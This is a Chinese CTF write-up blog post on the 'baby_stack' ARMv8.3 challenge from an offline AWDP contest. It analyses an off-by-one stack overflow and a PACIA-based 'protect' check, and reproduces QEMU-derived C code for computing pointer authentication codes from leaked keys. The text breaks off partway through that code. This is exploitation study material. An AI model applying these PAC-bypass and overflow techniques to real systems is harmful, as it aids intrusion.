@@ -1,0 +1,472 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>祥云杯线下 baby_stack 中的 PAC - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="之前的祥云杯线下 AWDp 中碰到了一道 ARMv8.3 的题，题目自身有一个简单的栈溢出漏洞，所以修起来十分容易，到最后被修到每轮只有 72 分，但是直到结束也没有一支队"><meta property="og:image" content><meta property="og:title" content="祥云杯线下 baby_stack 中的 PAC"><meta property="og:description" content="之前的祥云杯线下 AWDp 中碰到了一道 ARMv8.3 的题，题目自身有一个简单的栈溢出漏洞，所以修起来十分容易，到最后被修到每轮只有 72 分，但是直到结束也没有一支队"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/pwnreview/1559.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-10-27T09:00:00+00:00"><meta property="article:modified_time" content="2021-10-27T09:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="祥云杯线下 baby_stack 中的 PAC"><meta name=twitter:description content="之前的祥云杯线下 AWDp 中碰到了一道 ARMv8.3 的题，题目自身有一个简单的栈溢出漏洞，所以修起来十分容易，到最后被修到每轮只有 72 分，但是直到结束也没有一支队"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>祥云杯线下 baby_stack 中的 PAC</h1><div class=meta>Posted on Oct 27, 2021</div></div><section class=body><p>之前的祥云杯线下 AWDp 中碰到了一道 ARMv8.3 的题，题目自身有一个简单的栈溢出漏洞，所以修起来十分容易，到最后被修到每轮只有 72 分，但是直到结束也没有一支队伍攻击成功，我猜测大家应该都是被 <code>PACIA</code> 这个神奇的指令卡住了。暂时不考虑在一个断网的比赛环境里面考这样一个比较冷门的防护合不合适，但就题来说还是挺有意思的，我们队在比赛时虽然成功实现了 protect 函数的绕过，但是之后的 rop 就不会了，一方面是不会绕过第一次的 AUTIASP 检测（不过这个可以爆破，1/256 还是可以接受的），另一方面也的确是不会写 aarch64 的 rop。</p><h3 id=漏洞分析>漏洞分析</h3><p>题目拿到手，很容易可以发现 read_n 函数中存在一个 off-by-one</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>__int64</span> <span style=color:#007020;font-weight:700>__fastcall</span> <span style=color:#06287e>read_n</span>(<span style=color:#007020;font-weight:700>__int64</span> a1, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> a2)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int64</span> result; <span style=color:#60a0b0;font-style:italic>// x0
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int8</span> v5; <span style=color:#60a0b0;font-style:italic>// [xsp+2Bh] [xbp+2Bh] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> i; <span style=color:#60a0b0;font-style:italic>// [xsp+2Ch] [xbp+2Ch]
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> ( i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; ; <span style=color:#666>++</span>i )
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    result <span style=color:#666>=</span> i;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( a2 <span style=color:#666>&lt;</span> i )
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( (<span style=color:#902000>int</span>)read(<span style=color:#40a070>0LL</span>, <span style=color:#666>&amp;</span>v5, <span style=color:#40a070>1LL</span>) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span> )
+</span></span><span style=display:flex><span>      exit(<span style=color:#40a070>0xFFFFFFFFLL</span>);
+</span></span><span style=display:flex><span>    result <span style=color:#666>=</span> v5;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( v5 <span style=color:#666>==</span> <span style=color:#40a070>10</span> )
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#666>*</span>(_BYTE <span style=color:#666>*</span>)(a1 <span style=color:#666>+</span> (<span style=color:#902000>int</span>)i) <span style=color:#666>=</span> v5;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> result;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>通过这个 off-by-one 最多可以修改 v4 为 0x1FF，在末尾处的 read 中</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>  puts(<span style=color:#4070a0>&#34;Your new data:&#34;</span>);
+</span></span><span style=display:flex><span>  read(<span style=color:#40a070>0LL</span>, <span style=color:#666>&amp;</span>v5, v4);
+</span></span></code></pre></div><p>就可以实现栈溢出。修起来比较容易。要实现利用则比较困难，首先，要先绕过一个 protect 函数，如下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>    EXPORT protect
+</span></span><span style=display:flex><span>    protect
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    var_10<span style=color:#666>=</span> <span style=color:#666>-</span><span style=color:#40a070>0x10</span>
+</span></span><span style=display:flex><span>    var_8<span style=color:#666>=</span> <span style=color:#666>-</span><span style=color:#40a070>8</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    ; __unwind {
+</span></span><span style=display:flex><span><span style=color:#40a070>000</span> SUB             SP, SP, <span>#</span><span style=color:#40a070>0x10</span> ; Rd <span style=color:#666>=</span> Op1 <span style=color:#666>-</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> STR             X0, [SP,<span>#</span><span style=color:#40a070>0x10</span><span style=color:#666>+</span>var_8] ; Store to Memory
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> STR             X1, [SP,<span>#</span><span style=color:#40a070>0x10</span><span style=color:#666>+</span>var_10] ; Store to Memory
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> MOV             X9, SP  ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> MOV             W12, <span>#</span><span style=color:#40a070>0x1337</span> ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> MOV             SP, X12 ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> MOV             X11, <span>#</span><span style=color:#40a070>0</span> ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LDR             W10, [X0] ; Load from Memory
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> PACIA           X10, SP ; Pointer Authentication Code <span style=color:#007020;font-weight:700>for</span> address
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSR             X10, X10, <span>#</span><span style=color:#40a070>0x30</span> ; <span style=color:#4070a0>&#39;0&#39;</span> ; Logical Shift Right
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSL             X11, X11, <span>#</span><span style=color:#40a070>8</span> ; Logical Shift Left
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> ADD             X11, X11, X10 ; Rd <span style=color:#666>=</span> Op1 <span style=color:#666>+</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LDR             W10, [X0,<span>#</span><span style=color:#40a070>4</span>] ; Load from Memory
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> PACIA           X10, SP ; Pointer Authentication Code <span style=color:#007020;font-weight:700>for</span> address
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSR             X10, X10, <span>#</span><span style=color:#40a070>0x30</span> ; <span style=color:#4070a0>&#39;0&#39;</span> ; Logical Shift Right
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSL             X11, X11, <span>#</span><span style=color:#40a070>8</span> ; Logical Shift Left
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> ADD             X11, X11, X10 ; Rd <span style=color:#666>=</span> Op1 <span style=color:#666>+</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> MOV             W12, <span>#</span><span style=color:#40a070>0x1338</span> ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> MOV             SP, X12 ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LDR             W10, [X0,<span>#</span><span style=color:#40a070>8</span>] ; Load from Memory
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> PACIA           X10, SP ; Pointer Authentication Code <span style=color:#007020;font-weight:700>for</span> address
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSR             X10, X10, <span>#</span><span style=color:#40a070>0x30</span> ; <span style=color:#4070a0>&#39;0&#39;</span> ; Logical Shift Right
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSL             X11, X11, <span>#</span><span style=color:#40a070>8</span> ; Logical Shift Left
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> ADD             X11, X11, X10 ; Rd <span style=color:#666>=</span> Op1 <span style=color:#666>+</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LDR             W10, [X0,<span>#</span><span style=color:#40a070>0xC</span>] ; Load from Memory
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> PACIA           X10, SP ; Pointer Authentication Code <span style=color:#007020;font-weight:700>for</span> address
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSR             X10, X10, <span>#</span><span style=color:#40a070>0x30</span> ; <span style=color:#4070a0>&#39;0&#39;</span> ; Logical Shift Right
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSL             X11, X11, <span>#</span><span style=color:#40a070>8</span> ; Logical Shift Left
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> ADD             X11, X11, X10 ; Rd <span style=color:#666>=</span> Op1 <span style=color:#666>+</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> MOV             W12, <span>#</span><span style=color:#40a070>0x1339</span> ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> MOV             SP, X12 ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LDR             W10, [X0,<span>#</span><span style=color:#40a070>0x10</span>] ; Load from Memory
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> PACIA           X10, SP ; Pointer Authentication Code <span style=color:#007020;font-weight:700>for</span> address
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSR             X10, X10, <span>#</span><span style=color:#40a070>0x30</span> ; <span style=color:#4070a0>&#39;0&#39;</span> ; Logical Shift Right
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSL             X11, X11, <span>#</span><span style=color:#40a070>8</span> ; Logical Shift Left
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> ADD             X11, X11, X10 ; Rd <span style=color:#666>=</span> Op1 <span style=color:#666>+</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LDR             W10, [X0,<span>#</span><span style=color:#40a070>0x14</span>] ; Load from Memory
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> PACIA           X10, SP ; Pointer Authentication Code <span style=color:#007020;font-weight:700>for</span> address
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSR             X10, X10, <span>#</span><span style=color:#40a070>0x30</span> ; <span style=color:#4070a0>&#39;0&#39;</span> ; Logical Shift Right
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSL             X11, X11, <span>#</span><span style=color:#40a070>8</span> ; Logical Shift Left
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> ADD             X11, X11, X10 ; Rd <span style=color:#666>=</span> Op1 <span style=color:#666>+</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> MOV             W12, <span>#</span><span style=color:#40a070>0x133A</span> ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> MOV             SP, X12 ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LDR             W10, [X0,<span>#</span><span style=color:#40a070>0x18</span>] ; Load from Memory
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> PACIA           X10, SP ; Pointer Authentication Code <span style=color:#007020;font-weight:700>for</span> address
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSR             X10, X10, <span>#</span><span style=color:#40a070>0x30</span> ; <span style=color:#4070a0>&#39;0&#39;</span> ; Logical Shift Right
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSL             X11, X11, <span>#</span><span style=color:#40a070>8</span> ; Logical Shift Left
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> ADD             X11, X11, X10 ; Rd <span style=color:#666>=</span> Op1 <span style=color:#666>+</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LDR             W10, [X0,<span>#</span><span style=color:#40a070>0x1C</span>] ; Load from Memory
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> PACIA           X10, SP ; Pointer Authentication Code <span style=color:#007020;font-weight:700>for</span> address
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSR             X10, X10, <span>#</span><span style=color:#40a070>0x30</span> ; <span style=color:#4070a0>&#39;0&#39;</span> ; Logical Shift Right
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LSL             X11, X11, <span>#</span><span style=color:#40a070>8</span> ; Logical Shift Left
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> ADD             X11, X11, X10 ; Rd <span style=color:#666>=</span> Op1 <span style=color:#666>+</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> STR             X11, [X1] ; Store to Memory
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> MOV             SP, X9  ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> PACIA           X10, SP ; Pointer Authentication Code <span style=color:#007020;font-weight:700>for</span> address
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> ADD             SP, SP, <span>#</span><span style=color:#40a070>0x10</span> ; Rd <span style=color:#666>=</span> Op1 <span style=color:#666>+</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>000</span> RET                     ; Return from Subroutine
+</span></span><span style=display:flex><span>    ; } <span style=color:#60a0b0;font-style:italic>// starts at 400860
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    ; End of function protect
+</span></span></code></pre></div><h3 id=pac-机制>PAC 机制</h3><p>这里面比较奇怪的就是 <code>PACIA</code> 这个指令了，IDA 的 auto comment 中只写到指令功能为 “Pointer Authentication Code for address”，比赛期间我们通过 qemu 的源码大体搞清楚了它在做什么，赛后查了查资料，引用原文</p><blockquote><p>The basic idea behind Pointer Authentication is that the actual address space in 64-bit architectures is less than 64-bits. There are unused bits in pointer values that we can use to place a Pointer Authentication Code (PAC) for this pointer. We could insert a PAC into each pointer we want to protect before writing it to memory, and verify its integrity before using it. An attacker who wants to modify a protected pointer would have to find/guess the correct PAC to be able to control the program flow.</p></blockquote><p>散装地翻译一下，就是 PAC 利用了 64 位程序的地址不会使用所有 64 bit 的特点，在指针被存入内存前（比如函数调用时返回地址被压入栈前），在这些未被使用的位上加上一个 PAC 码，当下一次使用它时，再验证 PAC 码的正确性。如此，攻击者就必须找出或猜出 PAC 的值才能控制程序执行流。</p><p>为了实现计算出 PAC 码，需要 data（64-bit），modifier（64-bit），key（128-bit，由两个 64-bit 的 key 组成）。key 应当由高特权级维护，储存于内部寄存器中，EL0（user mode，类似于 x86 中的 ring3）无权访问。同时为了让每次加密生成的 PAC 码随机化，modifier 也需要相对随机，在对返回地址加密时，一般使用栈指针 sp。</p><p>PACIA 属于 PAC* 指令族，类似的还有 PACIASP，PACIA 接受两个参数，即 <code>PACIA data, modifier</code>，PACIASP 仅接受一个参数，即 <code>PACIASP data</code>，使用 sp 做 modifier。</p><p>从加密的角度上来看，为了生成可用的 PAC 码，需要有一个足够轻量化又足够强的加密算法，似乎现有的加密算法都不太适合，所以开发者发明了 QARMA 这样一个加密算法来生成，对于加密而言，本人并未研究密码学，暂时不考虑加密算法本身的漏洞。</p><p>那么对于 PAC 机制的攻击，最理想的情况是 leak 出 key 和 modifier，由于加密算法是公开的，此时可以直接算出对应的 PAC 码。</p><p>回到题目，这道题在连接远程环境时，会直接把两个 key 给我们。</p><p>我们再来看 protect 中的加密</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#40a070>010</span> MOV             W12, <span>#</span><span style=color:#40a070>0x1337</span> ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> MOV             SP, X12 ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> MOV             X11, <span>#</span><span style=color:#40a070>0</span> ; Rd <span style=color:#666>=</span> Op2
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> LDR             W10, [X0] ; Load from Memory
+</span></span><span style=display:flex><span><span style=color:#40a070>010</span> PACIA           X10, SP ; Pointer Authentication Code <span style=color:#007020;font-weight:700>for</span> address
+</span></span></code></pre></div><p>这里的 X10 就是 data，SP 就是 modifier。那么 protect 的加密过程就是根据输入的字符串，四个字节一组，使用硬编码的 modifier 进行加密，加密 8 次。</p><p>由于有了 key，modifier 也已知，所以我们可以直接绕过。为了计算，比赛的时候学长根据 qemu 源码写了一个对拍程序</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#include</span><span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span><span style=color:#007020>&lt;stdint.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span><span style=color:#007020>&lt;assert.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span><span style=color:#007020>&lt;string.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span><span style=color:#007020>&lt;stdlib.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#define MAKE_64BIT_MASK(shift, length) \
+</span></span></span><span style=display:flex><span><span style=color:#007020>    (((~0ULL) &gt;&gt; (64 - (length))) &lt;&lt; (shift))
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>uint64_t</span> <span style=color:#06287e>deposit64</span>(<span style=color:#902000>uint64_t</span> value, <span style=color:#902000>int</span> start, <span style=color:#902000>int</span> length,
+</span></span><span style=display:flex><span>                                 <span style=color:#902000>uint64_t</span> fieldval)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> mask;
+</span></span><span style=display:flex><span>    assert(start <span style=color:#666>&gt;=</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> length <span style=color:#666>&gt;</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> length <span style=color:#666>&lt;=</span> <span style=color:#40a070>64</span> <span style=color:#666>-</span> start);
+</span></span><span style=display:flex><span>    mask <span style=color:#666>=</span> (<span style=color:#666>~</span><span style=color:#40a070>0ULL</span> <span style=color:#666>&gt;&gt;</span> (<span style=color:#40a070>64</span> <span style=color:#666>-</span> length)) <span style=color:#666>&lt;&lt;</span> start;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (value <span style=color:#666>&amp;</span> <span style=color:#666>~</span>mask) <span style=color:#666>|</span> ((fieldval <span style=color:#666>&lt;&lt;</span> start) <span style=color:#666>&amp;</span> mask);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>int64_t</span> <span style=color:#06287e>sextract64</span>(<span style=color:#902000>uint64_t</span> value, <span style=color:#902000>int</span> start, <span style=color:#902000>int</span> length)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    assert(start <span style=color:#666>&gt;=</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> length <span style=color:#666>&gt;</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> length <span style=color:#666>&lt;=</span> <span style=color:#40a070>64</span> <span style=color:#666>-</span> start);
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>/* Note that this implementation relies on right shift of signed
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     * integers being an arithmetic shift.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     */</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> ((<span style=color:#902000>int64_t</span>)(value <span style=color:#666>&lt;&lt;</span> (<span style=color:#40a070>64</span> <span style=color:#666>-</span> length <span style=color:#666>-</span> start))) <span style=color:#666>&gt;&gt;</span> (<span style=color:#40a070>64</span> <span style=color:#666>-</span> length);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>uint32_t</span> <span style=color:#06287e>extract32</span>(<span style=color:#902000>uint32_t</span> value, <span style=color:#902000>int</span> start, <span style=color:#902000>int</span> length)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    assert(start <span style=color:#666>&gt;=</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> length <span style=color:#666>&gt;</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> length <span style=color:#666>&lt;=</span> <span style=color:#40a070>32</span> <span style=color:#666>-</span> start);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (value <span style=color:#666>&gt;&gt;</span> start) <span style=color:#666>&amp;</span> (<span style=color:#666>~</span><span style=color:#40a070>0U</span> <span style=color:#666>&gt;&gt;</span> (<span style=color:#40a070>32</span> <span style=color:#666>-</span> length));
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>int</span> <span style=color:#06287e>rot_cell</span>(<span style=color:#902000>int</span> cell, <span style=color:#902000>int</span> n)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>/* 4-bit rotate left by n.  */</span>
+</span></span><span style=display:flex><span>    cell <span style=color:#666>|=</span> cell <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>4</span>;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> extract32(cell, <span style=color:#40a070>4</span> <span style=color:#666>-</span> n, <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>uint64_t</span> <span style=color:#06287e>extract64</span>(<span style=color:#902000>uint64_t</span> value, <span style=color:#902000>int</span> start, <span style=color:#902000>int</span> length)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    assert(start <span style=color:#666>&gt;=</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> length <span style=color:#666>&gt;</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> length <span style=color:#666>&lt;=</span> <span style=color:#40a070>64</span> <span style=color:#666>-</span> start);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (value <span style=color:#666>&gt;&gt;</span> start) <span style=color:#666>&amp;</span> (<span style=color:#666>~</span><span style=color:#40a070>0ULL</span> <span style=color:#666>&gt;&gt;</span> (<span style=color:#40a070>64</span> <span style=color:#666>-</span> length));
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>uint64_t</span> <span style=color:#06287e>pac_cell_shuffle</span>(<span style=color:#902000>uint64_t</span> i)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> o <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>52</span>, <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>24</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>4</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>44</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i,  <span style=color:#40a070>0</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>12</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>28</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>16</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>48</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>20</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i,  <span style=color:#40a070>4</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>24</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>40</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>28</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>32</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>32</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>12</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>36</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>56</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>40</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>20</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>44</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i,  <span style=color:#40a070>8</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>48</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>36</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>52</span>;
